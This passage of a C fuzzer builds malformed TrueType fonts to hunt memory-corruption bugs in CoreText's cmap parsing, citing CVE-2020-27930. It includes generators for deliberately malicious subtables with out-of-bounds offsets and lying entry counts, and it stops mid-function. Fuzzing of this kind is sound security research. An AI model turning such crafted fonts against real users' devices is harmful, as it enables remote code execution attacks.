/*
 * cmap_variant_fuzzer.c - CoreText cmap format memory corruption hunter
 *
 * Programmatic TrueType font builder that generates fonts with all 9 cmap
 * format subtables, varying encoding values (focus on 255/256/257 boundary),
 * platform IDs, and format-specific edge cases. Each font is loaded through
 * CoreText APIs and exercised to trigger parsing bugs.
 *
 * CONTEXT: Confirmed infinite loop with encoding=256 + duplicate cmap records.
 * The same code path has format-specific parsers (0/2/4/6/8/10/12/13/14).
 * encoding=256 (0x100) causes integer truncation if stored in uint8,
 * routing data to unexpected format handlers.
 * CVE-2020-27930 achieved RCE via exactly this pattern.
 *
 * Build with ASAN + UBSAN:
 *   clang -g -O1 -fsanitize=address,undefined -fno-omit-frame-pointer \
 *     -framework CoreText -framework CoreGraphics -framework CoreFoundation \
 *     -o cmap_variant_fuzzer cmap_variant_fuzzer.c
 *
 * Run:
 *   ./cmap_variant_fuzzer [output_dir]
 */

#include <CoreText/CoreText.h>
#include <CoreGraphics/CoreGraphics.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <errno.h>

// ---- Configuration ----
#define TIMEOUT_SEC        5     // alarm timeout for infinite loops
#define MAX_GLYPHS_TEST    256   // max glyphs in test fonts
#define BMP_SAMPLE_COUNT   256   // characters to test per font
#define LOG_BUFFER_SIZE    4096

// ---- Big-endian helpers ----
static void w16(uint8_t *p, uint16_t v) {
    p[0] = (v >> 8) & 0xFF;
    p[1] = v & 0xFF;
}
static void w32(uint8_t *p, uint32_t v) {
    p[0] = (v >> 24) & 0xFF;
    p[1] = (v >> 16) & 0xFF;
    p[2] = (v >> 8)  & 0xFF;
    p[3] = v & 0xFF;
}
static uint32_t tt_checksum(const uint8_t *data, uint32_t len) {
    uint32_t sum = 0, nwords = (len + 3) / 4;
    for (uint32_t i = 0; i < nwords; i++) {
        uint32_t off = i * 4, word = 0;
        for (int b = 0; b < 4; b++) {
            word <<= 8;
            if (off + b < len) word |= data[off + b];
        }
        sum += word;
    }
    return sum;
}

// ---- Logging ----
static FILE *g_log = NULL;
static int g_total_tests = 0;
static int g_crashes = 0;
static int g_hangs = 0;
static int g_asan_hits = 0;
static int g_ubsan_hits = 0;
static int g_anomalies = 0;
static int g_ok = 0;

static void log_msg(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    fflush(stdout);

    if (g_log) {
        va_start(args, fmt);
        vfprintf(g_log, fmt, args);
        va_end(args);
        fflush(g_log);
    }
}

// ---- Signal handling ----
static volatile sig_atomic_t g_timed_out = 0;
static volatile sig_atomic_t g_crashed = 0;
static volatile sig_atomic_t g_crash_signal = 0;

static void alarm_handler(int sig) {
    (void)sig;
    g_timed_out = 1;
}

// ---- Required table builders ----

static size_t build_head(uint8_t *buf) {
    memset(buf, 0, 54);
    w16(buf + 0, 1); w16(buf + 2, 0);
    w32(buf + 4, 0x5F0F3CF5);
    w32(buf + 8, 0);
    w32(buf + 12, 0x5F0F3CF5);
    w16(buf + 16, 0x000B);
    w16(buf + 18, 1000);      // unitsPerEm
    w16(buf + 36, 0);
    w16(buf + 38, 0);
    w16(buf + 40, 1000);
    w16(buf + 42, 800);
    w16(buf + 44, 0);
    w16(buf + 46, 8);         // lowestRecPPEM
    w16(buf + 48, 2);
    w16(buf + 50, 1);         // indexToLocFormat = long
    w16(buf + 52, 0);
    return 54;
}

static size_t build_hhea(uint8_t *buf, uint16_t num_hmetrics) {
    memset(buf, 0, 36);
    w16(buf + 0, 1); w16(buf + 2, 0);
    w16(buf + 4, 800);
    w16(buf + 6, (uint16_t)(int16_t)-200);
    w16(buf + 8, 0);
    w16(buf + 10, 600);
    w16(buf + 34, num_hmetrics);
    return 36;
}

static size_t build_hmtx(uint8_t *buf, uint16_t n) {
    for (uint16_t i = 0; i < n; i++) {
        w16(buf + i * 4, 500);
        w16(buf + i * 4 + 2, 0);
    }
    return n * 4;
}

static size_t build_maxp(uint8_t *buf, uint16_t num_glyphs) {
    memset(buf, 0, 32);
    w32(buf + 0, 0x00010000);
    w16(buf + 4, num_glyphs);
    w16(buf + 6, 64);
    w16(buf + 8, 1);
    w16(buf + 14, 1);
    return 32;
}

static size_t build_loca_long(uint8_t *buf, uint16_t num_glyphs, uint32_t glyf_sz) {
    for (uint16_t i = 0; i <= num_glyphs; i++) {
        w32(buf + i * 4, (i < num_glyphs) ? 0 : glyf_sz);
    }
    return (num_glyphs + 1) * 4;
}

static size_t build_glyf(uint8_t *buf) {
    memset(buf, 0, 12);
    return 12;
}

static size_t build_os2(uint8_t *buf) {
    memset(buf, 0, 96);
    w16(buf + 0, 4);
    w16(buf + 2, 500);
    w16(buf + 4, 400);
    w16(buf + 6, 5);
    w16(buf + 78, 0x0020);
    w16(buf + 80, 0xFFFF);
    w16(buf + 68, 800);
    w16(buf + 70, (uint16_t)(int16_t)-200);
    return 96;
}

static size_t build_name(uint8_t *buf) {
    uint8_t name_data[] = {
        0, 0, 0, 1, 0, 18,
        0, 3, 0, 1, 0x04, 0x09, 0, 4, 0, 10, 0, 0,
        0, 'F', 0, 'u', 0, 'z', 0, 'z', 0, 'F'
    };
    memcpy(buf, name_data, sizeof(name_data));
    return sizeof(name_data);
}

static size_t build_post(uint8_t *buf) {
    memset(buf, 0, 32);
    w32(buf + 0, 0x00030000);
    return 32;
}

// =========================================================================
// cmap Format Subtable Builders
// =========================================================================

static size_t build_cmap_fmt0(uint8_t *buf) {
    w16(buf + 0, 0);
    w16(buf + 2, 262);
    w16(buf + 4, 0);
    for (int i = 0; i < 256; i++) {
        buf[6 + i] = (i >= 0x20 && i <= 0x7E) ? (uint8_t)(i - 0x1F) : 0;
    }
    return 262;
}

static size_t build_cmap_fmt2(uint8_t *buf) {
    size_t total = 6 + 512 + 16 + 512;
    w16(buf + 0, 2);
    w16(buf + 2, (uint16_t)total);
    w16(buf + 4, 0);

    uint8_t *keys = buf + 6;
    for (int i = 0; i < 256; i++) {
        w16(keys + i * 2, (i == 0) ? 0 : 8);
    }

    uint8_t *sh = buf + 518;
    w16(sh + 0, 0x0020); w16(sh + 2, 96); w16(sh + 4, 0); w16(sh + 6, 16);
    w16(sh + 8, 0); w16(sh + 10, 0); w16(sh + 12, 0); w16(sh + 14, 0);

    uint8_t *gids = buf + 534;
    for (int i = 0; i < 256; i++) {
        w16(gids + i * 2, (i < 96) ? (i + 1) : 0);
    }
    return total;
}

static size_t build_cmap_fmt4(uint8_t *buf) {
    uint16_t segCount = 2;
    size_t total = 14 + segCount * 8;
    w16(buf + 0, 4);
    w16(buf + 2, (uint16_t)total);
    w16(buf + 4, 0);
    w16(buf + 6, segCount * 2);
    w16(buf + 8, 4);
    w16(buf + 10, 1);
    w16(buf + 12, 0);

    uint8_t *p = buf + 14;
    w16(p + 0, 0x007F); w16(p + 2, 0xFFFF);
    p += segCount * 2;
    w16(p, 0); p += 2;
    w16(p + 0, 0x0020); w16(p + 2, 0xFFFF);
    p += segCount * 2;
    w16(p + 0, 0); w16(p + 2, 1);
    p += segCount * 2;
    w16(p + 0, 0); w16(p + 2, 0);
    return total;
}

static size_t build_cmap_fmt6(uint8_t *buf, uint16_t firstCode, uint16_t entryCount) {
    size_t total = 10 + entryCount * 2;
    w16(buf + 0, 6);
    w16(buf + 2, (uint16_t)total);
    w16(buf + 4, 0);
    w16(buf + 6, firstCode);
    w16(buf + 8, entryCount);
    for (uint16_t i = 0; i < entryCount; i++) {
        w16(buf + 10 + i * 2, (i % 254) + 1);
    }
    return total;
}

static size_t build_cmap_fmt8(uint8_t *buf) {
    uint32_t nGroups = 2;
    size_t total = 12 + 8192 + 4 + nGroups * 12;
    w16(buf + 0, 8);
    w16(buf + 2, 0);
    w32(buf + 4, (uint32_t)total);
    w32(buf + 8, 0);

    memset(buf + 12, 0, 8192);
    buf[12 + 0x10000 / 8] |= (1 << (7 - (0x10000 % 8)));

    w32(buf + 12 + 8192, nGroups);
    uint8_t *g = buf + 12 + 8192 + 4;
    w32(g + 0, 0x0020); w32(g + 4, 0x007F); w32(g + 8, 1);
    w32(g + 12, 0x10000); w32(g + 16, 0x10010); w32(g + 20, 100);
    return total;
}

static size_t build_cmap_fmt10(uint8_t *buf) {
    uint32_t numChars = 96;
    size_t total = 20 + numChars * 2;
    w16(buf + 0, 10);
    w16(buf + 2, 0);
    w32(buf + 4, (uint32_t)total);
    w32(buf + 8, 0);
    w32(buf + 12, 0x0020);
    w32(buf + 16, numChars);
    for (uint32_t i = 0; i < numChars; i++) {
        w16(buf + 20 + i * 2, (uint16_t)(i + 1));
    }
    return total;
}

static size_t build_cmap_fmt12(uint8_t *buf) {
    uint32_t nGroups = 3;
    size_t total = 16 + nGroups * 12;
    w16(buf + 0, 12);
    w16(buf + 2, 0);
    w32(buf + 4, (uint32_t)total);
    w32(buf + 8, 0);
    w32(buf + 12, nGroups);

    uint8_t *g = buf + 16;
    w32(g + 0, 0x0020); w32(g + 4, 0x007E); w32(g + 8, 1);
    w32(g + 12, 0x00A0); w32(g + 16, 0x00FF); w32(g + 20, 100);
    w32(g + 24, 0x4E00); w32(g + 28, 0x4E0F); w32(g + 32, 200);
    return total;
}

static size_t build_cmap_fmt13(uint8_t *buf) {
    uint32_t nGroups = 2;
    size_t total = 16 + nGroups * 12;
    w16(buf + 0, 13);
    w16(buf + 2, 0);
    w32(buf + 4, (uint32_t)total);
    w32(buf + 8, 0);
    w32(buf + 12, nGroups);

    uint8_t *g = buf + 16;
    w32(g + 0, 0x0020); w32(g + 4, 0x007E); w32(g + 8, 1);
    w32(g + 12, 0x4E00); w32(g + 16, 0x9FFF); w32(g + 20, 2);
    return total;
}

static size_t build_cmap_fmt14(uint8_t *buf) {
    uint32_t numRecords = 2;
    uint32_t headerSize = 10 + numRecords * 11;
    uint32_t duvs_off = headerSize;
    uint32_t duvs_sz = 4 + 1 * 4;
    uint32_t nduvs_off = duvs_off + duvs_sz;
    uint32_t nduvs_sz = 4 + 2 * 5;
    size_t total = nduvs_off + nduvs_sz;

    w16(buf + 0, 14);
    w32(buf + 2, (uint32_t)total);
    w32(buf + 6, numRecords);

    uint8_t *r = buf + 10;
    r[0] = 0x00; r[1] = 0xFE; r[2] = 0x00;
    w32(r + 3, duvs_off);
    w32(r + 7, 0);

    r = buf + 10 + 11;
    r[0] = 0x00; r[1] = 0xFE; r[2] = 0x01;
    w32(r + 3, 0);
    w32(r + 7, nduvs_off);

    uint8_t *duvs = buf + duvs_off;
    w32(duvs + 0, 1);
    duvs[4] = 0x00; duvs[5] = 0x00; duvs[6] = 0x41;
    duvs[7] = 25;

    uint8_t *nduvs = buf + nduvs_off;
    w32(nduvs + 0, 2);
    nduvs[4] = 0x00; nduvs[5] = 0x00; nduvs[6] = 0x41;
    w16(nduvs + 7, 5);
    nduvs[9] = 0x00; nduvs[10] = 0x00; nduvs[11] = 0x42;
    w16(nduvs + 12, 6);

    return total;
}

// =========================================================================
// Format subtable builder dispatch
// =========================================================================

static size_t build_subtable(uint16_t format, uint8_t *buf, size_t buf_sz) {
    memset(buf, 0, buf_sz);
    switch (format) {
        case 0:  return build_cmap_fmt0(buf);
        case 2:  return build_cmap_fmt2(buf);
        case 4:  return build_cmap_fmt4(buf);
        case 6:  return build_cmap_fmt6(buf, 0x0020, 96);
        case 8:  return build_cmap_fmt8(buf);
        case 10: return build_cmap_fmt10(buf);
        case 12: return build_cmap_fmt12(buf);
        case 13: return build_cmap_fmt13(buf);
        case 14: return build_cmap_fmt14(buf);
        default: return 0;
    }
}

// =========================================================================
// Font assembler
// =========================================================================

typedef struct {
    uint16_t platformID;
    uint16_t encodingID;
} CmapRecord;

static uint8_t *assemble_font(
    const uint8_t *cmap_subtable, size_t subtable_size,
    const CmapRecord *records, int num_records,
    uint16_t num_glyphs, size_t *out_size)
{
    uint8_t head[54];       size_t head_sz = build_head(head);
    uint8_t hhea[36];       size_t hhea_sz = build_hhea(hhea, num_glyphs);
    size_t hmtx_alloc = (num_glyphs + 1) * 4;
    uint8_t *hmtx_buf = calloc(1, hmtx_alloc);
    size_t hmtx_sz = build_hmtx(hmtx_buf, num_glyphs);
    uint8_t maxp[32];       size_t maxp_sz = build_maxp(maxp, num_glyphs);
    uint8_t glyf_buf[12];   size_t glyf_sz = build_glyf(glyf_buf);
    size_t loca_alloc = (num_glyphs + 2) * 4;
    uint8_t *loca_buf = calloc(1, loca_alloc);
    size_t loca_sz = build_loca_long(loca_buf, num_glyphs, (uint32_t)glyf_sz);
    uint8_t os2[96];        size_t os2_sz  = build_os2(os2);
    uint8_t name_buf[64];   size_t name_sz = build_name(name_buf);
    uint8_t post[32];       size_t post_sz = build_post(post);

    size_t cmap_hdr_sz = 4 + num_records * 8;
    size_t cmap_total = cmap_hdr_sz + subtable_size;
    uint8_t *cmap = calloc(1, cmap_total);
    if (!cmap) return NULL;

    w16(cmap + 0, 0);
    w16(cmap + 2, (uint16_t)num_records);

    for (int i = 0; i < num_records; i++) {
        uint32_t r = 4 + i * 8;
        w16(cmap + r + 0, records[i].platformID);
        w16(cmap + r + 2, records[i].encodingID);
        w32(cmap + r + 4, (uint32_t)cmap_hdr_sz);
    }
    memcpy(cmap + cmap_hdr_sz, cmap_subtable, subtable_size);

    struct {
        const char *tag;
        const uint8_t *data;
        size_t len;
        uint32_t offset;
    } tables[] = {
        {"OS/2", os2, os2_sz, 0},
        {"cmap", cmap, cmap_total, 0},
        {"glyf", glyf_buf, glyf_sz, 0},
        {"head", head, head_sz, 0},
        {"hhea", hhea, hhea_sz, 0},
        {"hmtx", hmtx_buf, hmtx_sz, 0},
        {"loca", loca_buf, loca_sz, 0},
        {"maxp", maxp, maxp_sz, 0},
        {"name", name_buf, name_sz, 0},
        {"post", post, post_sz, 0},
    };
    int num_tables = 10;

    uint32_t header_size = 12 + num_tables * 16;
    uint32_t offset = header_size;
    for (int i = 0; i < num_tables; i++) {
        tables[i].offset = offset;
        offset += (uint32_t)tables[i].len;
        while (offset % 4) offset++;
    }

    size_t total = offset;
    uint8_t *font = calloc(1, total);
    if (!font) { free(cmap); free(hmtx_buf); free(loca_buf); return NULL; }

    w32(font + 0, 0x00010000);
    w16(font + 4, (uint16_t)num_tables);

    int power2 = 1, es = 0;
    while (power2 * 2 <= num_tables) { power2 *= 2; es++; }
    w16(font + 6, (uint16_t)(power2 * 16));
    w16(font + 8, (uint16_t)es);
    w16(font + 10, (uint16_t)(num_tables * 16 - power2 * 16));

    for (int i = 0; i < num_tables; i++) {
        uint32_t entry = 12 + i * 16;
        memcpy(font + entry, tables[i].tag, 4);
        w32(font + entry + 4, tt_checksum(tables[i].data, (uint32_t)tables[i].len));
        w32(font + entry + 8, tables[i].offset);
        w32(font + entry + 12, (uint32_t)tables[i].len);
    }

    for (int i = 0; i < num_tables; i++) {
        memcpy(font + tables[i].offset, tables[i].data, tables[i].len);
    }

    free(cmap);
    free(hmtx_buf);
    free(loca_buf);
    *out_size = total;
    return font;
}

// =========================================================================
// CoreText exerciser -- the core fuzzing function
// =========================================================================

typedef struct {
    int loaded;                    // font loaded successfully
    int glyph_mapped;             // any glyph mapped (non-zero)
    int advance_ok;               // GetAdvancesForGlyphs succeeded
    int path_ok;                  // CreatePathForGlyph succeeded
    int anomaly;                  // unexpected glyph values
    int timed_out;                // hit alarm
    int crashed;                  // caught signal
    int crash_signal;
    uint16_t sample_glyphs[16];   // first 16 glyph mappings
    double sample_advances[16];
} FuzzResult;

/*
 * Exercise a font through CoreText APIs.
 * Must be called in a fork()ed child for crash isolation.
 * Writes result to *result.
 */
static void exercise_font(const uint8_t *font_data, size_t font_size,
                           FuzzResult *result)
{
    memset(result, 0, sizeof(*result));

    // Set alarm for infinite loop detection
    signal(SIGALRM, alarm_handler);
    g_timed_out = 0;
    alarm(TIMEOUT_SEC);

    // Create font from data
    CFDataRef cf_data = CFDataCreate(kCFAllocatorDefault, font_data, (CFIndex)font_size);
    if (!cf_data) return;

    CGDataProviderRef provider = CGDataProviderCreateWithCFData(cf_data);
    CFRelease(cf_data);
    if (!provider) return;

    CGFontRef cgfont = CGFontCreateWithDataProvider(provider);
    CGDataProviderRelease(provider);
    if (!cgfont) return;

    CTFontRef ctfont = CTFontCreateWithGraphicsFont(cgfont, 24.0, NULL, NULL);
    if (!ctfont) {
        CGFontRelease(cgfont);
        return;
    }

    result->loaded = 1;

    // Test 1: Map BMP characters through cmap
    // Focus on ASCII + Latin-1 + some CJK
    UniChar test_chars[] = {
        0x0000, 0x0001, 0x001F, 0x0020, 0x0041, 0x0042, 0x005A, 0x007E,
        0x007F, 0x0080, 0x00FF, 0x0100, 0x0101, 0x01FF, 0x0200, 0x0300,
        0x0400, 0x0500, 0x0FFF, 0x1000, 0x2000, 0x3000, 0x4E00, 0x4E01,
        0x9FFF, 0xA000, 0xD7FF, 0xE000, 0xF000, 0xFE00, 0xFEFF, 0xFF00,
        0xFFFD, 0xFFFE, 0xFFFF,
        // Boundary characters for encoding=256 testing
        0x00FE, 0x00FF, 0x0100, 0x0101, 0x0102,
        // Characters that exercise format 2 high-byte path
        0x8000, 0x8001, 0x80FF, 0x8100, 0x8101,
    };
    int num_test_chars = sizeof(test_chars) / sizeof(test_chars[0]);

    CGGlyph glyphs[sizeof(test_chars) / sizeof(test_chars[0])];
    memset(glyphs, 0, sizeof(glyphs));

    if (g_timed_out) { result->timed_out = 1; goto cleanup; }

    bool ok = CTFontGetGlyphsForCharacters(ctfont, test_chars, glyphs, num_test_chars);

    if (g_timed_out) { result->timed_out = 1; goto cleanup; }

    // Check for non-zero glyphs
    for (int i = 0; i < num_test_chars; i++) {
        if (glyphs[i] != 0) {
            result->glyph_mapped = 1;
            break;
        }
    }

    // Record first 16 glyph mappings
    for (int i = 0; i < 16 && i < num_test_chars; i++) {
        result->sample_glyphs[i] = glyphs[i];
    }

    // Check for anomalous glyph values (higher than num_glyphs)
    for (int i = 0; i < num_test_chars; i++) {
        if (glyphs[i] > MAX_GLYPHS_TEST && glyphs[i] != 0 && glyphs[i] != 0xFFFF) {
            result->anomaly = 1;
        }
    }

    // Test 2: Get advances for mapped glyphs
    if (result->glyph_mapped) {
        CGSize advances[sizeof(test_chars) / sizeof(test_chars[0])];
        memset(advances, 0, sizeof(advances));

        if (g_timed_out) { result->timed_out = 1; goto cleanup; }

        double total = CTFontGetAdvancesForGlyphs(ctfont, kCTFontOrientationHorizontal,
                                                   glyphs, advances, num_test_chars);
        result->advance_ok = (total > 0);

        for (int i = 0; i < 16 && i < num_test_chars; i++) {
            result->sample_advances[i] = advances[i].width;
        }
    }

    if (g_timed_out) { result->timed_out = 1; goto cleanup; }

    // Test 3: Create glyph paths (exercises outline parsing)
    for (int i = 0; i < num_test_chars && i < 8; i++) {
        if (glyphs[i] != 0) {
            if (g_timed_out) { result->timed_out = 1; goto cleanup; }

            CGPathRef path = CTFontCreatePathForGlyph(ctfont, glyphs[i], NULL);
            if (path) {
                result->path_ok = 1;
                CGPathRelease(path);
            }
        }
    }

    if (g_timed_out) { result->timed_out = 1; goto cleanup; }

    // Test 4: Full BMP scan - the heavy test
    // Map characters 0x0000-0x00FF (the encoding boundary zone)
    {
        UniChar bmp_chars[256];
        CGGlyph bmp_glyphs[256];
        for (int i = 0; i < 256; i++) {
            bmp_chars[i] = (UniChar)i;
        }

        CTFontGetGlyphsForCharacters(ctfont, bmp_chars, bmp_glyphs, 256);

        if (g_timed_out) { result->timed_out = 1; goto cleanup; }

        // Check for anomalous mappings in the 0x00-0xFF range
        for (int i = 0; i < 256; i++) {
            if (bmp_glyphs[i] > MAX_GLYPHS_TEST && bmp_glyphs[i] != 0) {
                result->anomaly = 1;
            }
        }
    }

    // Test 5: Map characters in 0x0100-0x01FF range (encoding=256 zone)
    {
        UniChar enc256_chars[256];
        CGGlyph enc256_glyphs[256];
        for (int i = 0; i < 256; i++) {
            enc256_chars[i] = (UniChar)(0x0100 + i);
        }

        CTFontGetGlyphsForCharacters(ctfont, enc256_chars, enc256_glyphs, 256);

        if (g_timed_out) { result->timed_out = 1; goto cleanup; }

        for (int i = 0; i < 256; i++) {
            if (enc256_glyphs[i] > MAX_GLYPHS_TEST && enc256_glyphs[i] != 0) {
                result->anomaly = 1;
            }
        }
    }

    // Test 6: Get advances for full glyph range to exercise hmtx parsing
    {
        CGGlyph glyph_range[MAX_GLYPHS_TEST];
        CGSize adv_range[MAX_GLYPHS_TEST];
        for (int i = 0; i < MAX_GLYPHS_TEST; i++) {
            glyph_range[i] = (CGGlyph)i;
        }

        if (g_timed_out) { result->timed_out = 1; goto cleanup; }

        CTFontGetAdvancesForGlyphs(ctfont, kCTFontOrientationHorizontal,
                                    glyph_range, adv_range, MAX_GLYPHS_TEST);

        if (g_timed_out) { result->timed_out = 1; goto cleanup; }
    }

cleanup:
    alarm(0);
    CFRelease(ctfont);
    CGFontRelease(cgfont);
}

// =========================================================================
// Test runner with fork() isolation
// =========================================================================

typedef struct {
    uint16_t format;
    uint16_t encoding;
    uint16_t platform;
    const char *variant;       // "standard", "dual", "special_xxx"
} TestCase;

static const char *signal_name(int sig) {
    switch (sig) {
        case SIGSEGV: return "SIGSEGV";
        case SIGBUS:  return "SIGBUS";
        case SIGABRT: return "SIGABRT";
        case SIGFPE:  return "SIGFPE";
        case SIGILL:  return "SIGILL";
        case SIGTRAP: return "SIGTRAP";
        default:      return "UNKNOWN";
    }
}

/*
 * Run a single test case in a forked child process.
 * Returns: 0=ok, 1=hang, 2=crash, 3=asan_hit, 4=anomaly
 */
static int run_test_case(const uint8_t *font_data, size_t font_size,
                          const TestCase *tc, FuzzResult *result)
{
    // Use a pipe to communicate results from child to parent
    int pipefd[2];
    if (pipe(pipefd) != 0) {
        perror("pipe");
        return -1;
    }

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (pid == 0) {
        // Child process
        close(pipefd[0]);

        FuzzResult child_result;
        exercise_font(font_data, font_size, &child_result);

        // Write result to pipe
        write(pipefd[1], &child_result, sizeof(child_result));
        close(pipefd[1]);
        _exit(child_result.timed_out ? 99 : 0);
    }

    // Parent process
    close(pipefd[1]);

    // Wait for child with polling timeout (do NOT use alarm in parent)
    int status;
    int parent_timeout_ms = (TIMEOUT_SEC + 5) * 1000;
    int elapsed_ms = 0;
    int child_done = 0;

    while (elapsed_ms < parent_timeout_ms) {
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w > 0) { child_done = 1; break; }
        if (w < 0 && errno != EINTR) break;
        usleep(10000);  // 10ms
        elapsed_ms += 10;
    }

    if (!child_done) {
        // Child timed out
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        close(pipefd[0]);
        memset(result, 0, sizeof(*result));
        result->timed_out = 1;
        return 1;
    }

    // Read result from pipe
    ssize_t n = read(pipefd[0], result, sizeof(*result));
    close(pipefd[0]);

    if (n != sizeof(*result)) {
        memset(result, 0, sizeof(*result));
    }

    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        result->crashed = 1;
        result->crash_signal = sig;
        return 2;
    }

    if (WIFEXITED(status)) {
        int exit_code = WEXITSTATUS(status);
        if (exit_code == 99) {
            result->timed_out = 1;
            return 1;
        }
        // Exit code 1 often means ASAN found something
        if (exit_code == 1) {
            return 3;  // likely ASAN
        }
    }

    if (result->anomaly) return 4;
    return 0;
}

// =========================================================================
// Test matrix definitions
// =========================================================================

static const uint16_t FUZZ_ENCODINGS[] = {
    0, 1, 3, 10,
    255, 256, 257,
    512, 768, 1024,
    32767, 32768,
    65534, 65535,
};
static const int NUM_FUZZ_ENCODINGS = sizeof(FUZZ_ENCODINGS) / sizeof(FUZZ_ENCODINGS[0]);

static const uint16_t FUZZ_PLATFORMS[] = { 0, 1, 3, 4 };
static const int NUM_FUZZ_PLATFORMS = sizeof(FUZZ_PLATFORMS) / sizeof(FUZZ_PLATFORMS[0]);

static const uint16_t FUZZ_FORMATS[] = { 0, 2, 4, 6, 8, 10, 12, 13, 14 };
static const int NUM_FUZZ_FORMATS = sizeof(FUZZ_FORMATS) / sizeof(FUZZ_FORMATS[0]);

static const char *format_name(uint16_t fmt) {
    switch (fmt) {
        case 0:  return "fmt0_byte";
        case 2:  return "fmt2_highbyte";
        case 4:  return "fmt4_segment";
        case 6:  return "fmt6_trimmed";
        case 8:  return "fmt8_mixed";
        case 10: return "fmt10_trim32";
        case 12: return "fmt12_seg32";
        case 13: return "fmt13_m2o";
        case 14: return "fmt14_var";
        default: return "unknown";
    }
}

// =========================================================================
// Special variant generators
// =========================================================================

/*
 * Format 6 with entryCount wrapping: firstCode=0xFF00, entryCount=0x200
 * This covers 0xFF00 to 0x0100 (wrapped) which is the enc=256 zone
 */
static uint8_t *build_special_fmt6_wrap(uint16_t enc, uint16_t plat, size_t *out_size) {
    size_t entries = 512;
    size_t sub_sz = 10 + entries * 2;
    uint8_t *sub = calloc(1, sub_sz);
    if (!sub) return NULL;

    w16(sub + 0, 6);
    w16(sub + 2, (uint16_t)sub_sz);
    w16(sub + 4, 0);
    w16(sub + 6, 0xFF00);                // firstCode near max
    w16(sub + 8, (uint16_t)entries);

    for (size_t i = 0; i < entries; i++) {
        w16(sub + 10 + i * 2, (uint16_t)((i % 254) + 1));
    }

    CmapRecord recs[] = {{plat, enc}};
    uint8_t *font = assemble_font(sub, sub_sz, recs, 1, 256, out_size);
    free(sub);
    return font;
}

/*
 * Format 6 with entryCount = 65535 (maximum) - should cause massive read
 */
static uint8_t *build_special_fmt6_maxentry(uint16_t enc, uint16_t plat, size_t *out_size) {
    // Only allocate a small actual glyphIdArray but claim huge entryCount
    uint16_t actual_entries = 128;
    size_t sub_sz = 10 + actual_entries * 2;
    uint8_t *sub = calloc(1, sub_sz);
    if (!sub) return NULL;

    w16(sub + 0, 6);
    w16(sub + 2, (uint16_t)sub_sz);   // claimed length matches actual
    w16(sub + 4, 0);
    w16(sub + 6, 0x0100);             // firstCode = 256
    w16(sub + 8, 0xFFFF);             // entryCount = 65535 (THE LIE - way past actual data)

    for (uint16_t i = 0; i < actual_entries; i++) {
        w16(sub + 10 + i * 2, (uint16_t)((i % 254) + 1));
    }

    CmapRecord recs[] = {{plat, enc}};
    uint8_t *font = assemble_font(sub, sub_sz, recs, 1, 256, out_size);
    free(sub);
    return font;
}

/*
 * Format 2 with malicious idRangeOffset values that point outside the table
 */
static uint8_t *build_special_fmt2_oob_range(uint16_t enc, uint16_t plat, size_t *out_size) {
    size_t total = 6 + 512 + 32 + 512;
    uint8_t *sub = calloc(1, total);
    if (!sub) return NULL;

    w16(sub + 0, 2);
    w16(sub + 2, (uint16_t)total);
    w16(sub + 4, 0);

    // Route high bytes to different subHeaders
    uint8_t *keys = sub + 6;
    for (int i = 0; i < 256; i++) {
        w16(keys + i * 2, (uint16_t)((i % 4) * 8));
    }

    // 4 subHeaders with increasingly dangerous values
    uint8_t *sh = sub + 518;

    // subHeader 0: normal
    w16(sh + 0, 0); w16(sh + 2, 128); w16(sh + 4, 0); w16(sh + 6, 32);

    // subHeader 1: huge entryCount
    w16(sh + 8, 0); w16(sh + 10, 255); w16(sh + 12, 0); w16(sh + 14, 32);

    // subHeader 2: idRangeOffset pointing WAY outside table
    w16(sh + 16, 0); w16(sh + 18, 64);
    w16(sh + 20, 0); w16(sh + 22, 0xFFF0);  // relative offset goes far past table

    // subHeader 3: large negative idDelta
    w16(sh + 24, 0); w16(sh + 26, 32);
    w16(sh + 28, (uint16_t)(int16_t)-32768); w16(sh + 30, 32);

    uint8_t *gids = sub + 550;
    for (int i = 0; i < 256; i++) {
        w16(gids + i * 2, (uint16_t)((i % 254) + 1));
    }

    CmapRecord recs[] = {{plat, enc}};
    uint8_t *font = assemble_font(sub, total, recs, 1, 256, out_size);
    free(sub);
    return font;
}

/*
 * Format 0 with encoding=256: the 256-byte array boundary test
 * A 256-byte array indexed by encoding=256 reads one byte past the end
 */
static uint8_t *build_special_fmt0_boundary(uint16_t enc, uint16_t plat, size_t *out_size) {
    uint8_t sub[262];
    size_t sub_sz = build_cmap_fmt0(sub);
    CmapRecord recs[] = {{plat, enc}};
    return assemble_font(sub, sub_sz, recs, 1, 2, out_size);
}

/*
 * Format 14 with malicious variation selector records
 */
static uint8_t *build_special_fmt14_malicious(uint16_t enc, uint16_t plat, size_t *out_size) {
    // Build format 14 with offsets pointing past the table
    size_t total = 64;
    uint8_t *sub = calloc(1, total);
    if (!sub) return NULL;

    uint32_t numRecords = 3;
    w16(sub + 0, 14);
    w32(sub + 2, (uint32_t)total);
    w32(sub + 6, numRecords);

    // Record 0: valid default UVS at offset 43
    uint8_t *r = sub + 10;
    r[0] = 0x00; r[1] = 0xFE; r[2] = 0x00;     // VS1
    w32(r + 3, 43);                               // defaultUVSOffset
    w32(r + 7, 0);

    // Record 1: non-default UVS offset PAST the table
    r = sub + 10 + 11;
    r[0] = 0x00; r[1] = 0xFE; r[2] = 0x01;     // VS2
    w32(r + 3, 0);
    w32(r + 7, 0xFFFFFFF0);                      // nonDefaultUVSOffset = WAY past table (OOB!)

    // Record 2: both offsets are huge
    r = sub + 10 + 22;
    r[0] = 0x00; r[1] = 0xFE; r[2] = 0x02;     // VS3
    w32(r + 3, 0x7FFFFFFF);                      // defaultUVSOffset = huge
    w32(r + 7, 0x80000000);                      // nonDefaultUVSOffset = sign flip

    // Default UVS table at offset 43
    uint8_t *duvs = sub + 43;
    w32(duvs + 0, 1);
    duvs[4] = 0x00; duvs[5] = 0x00; duvs[6] = 0x41;
    duvs[7] = 25;

    CmapRecord recs[] = {{plat, enc}};
